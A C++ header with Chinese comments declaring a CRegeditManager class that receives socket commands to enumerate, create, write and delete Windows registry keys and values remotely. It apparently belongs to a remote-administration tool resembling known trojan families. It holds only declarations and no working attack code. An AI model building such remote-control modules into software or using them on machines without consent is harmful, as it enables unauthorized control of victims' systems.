// RegeditManager.h: interface for the CRegeditManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_REGEDITMANAGER_H__5EB9DC64_B5E9_4EEA_88AE_353F0F1F4B4B__INCLUDED_)
#define AFX_REGEDITMANAGER_H__5EB9DC64_B5E9_4EEA_88AE_353F0F1F4B4B__INCLUDED_
#include "Manager.h"

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
struct REGMSG
{
	int count;         //名字个数
	DWORD size;        //名字大小
	DWORD valsize;     //值大小 
};

class CRegeditManager : public CManager    
{
public:
	CRegeditManager(CClientSocket *pClient);
	virtual ~CRegeditManager();
	void OnReceive(LPBYTE lpBuffer, UINT nSize);


private:
	void EnumReg(BYTE bToken,LPBYTE lpBuffer);
	LPBYTE GetRegInfo();
	LPBYTE GetRegKey();
	
	void  CreateKey(LPBYTE lpBuffer);
	BOOL  MyCreateKey(LPCTSTR lpSubKey);

	void  DeleteVal(char* buf);
	void  DeleteKey(LPBYTE lpBuffer);
	BOOL  MyDeleteKey(LPCTSTR lpSubKey);

	BOOL  DeleteValue(LPCTSTR lpValueName);

	void  ParseKey(BYTE bType);
	BOOL  OpenKey(LPCTSTR lpSubKey);
	BOOL  WriteValue(LPCTSTR lpSubKey, LPCTSTR lpVal);
	BOOL  WriteValue(LPCTSTR lpSubKey, DWORD dwVal);
	BOOL  WriteBuf(LPCTSTR lpValueName, LPCTSTR lpValue) ;

	void SendSucceed();
	void SendError();
	LONG IsHaveSubkeys(DWORD & dwRet);

	void CreateKeyEx(char *buf);
	void CreatSTR(char *buf);
	void CreatDWORD(char *buf);
	void CreatEXSTR(char *buf);
    HKEY        m_hKey;
	HKEY        m_hKey_n;

	HKEY		MKEY;
	char        KeyPath[MAX_PATH];  
};
#endif // !defined(AFX_REGEDITMANAGER_H__5EB9DC64_B5E9_4EEA_88AE_353F0F1F4B4B__INCLUDED_)
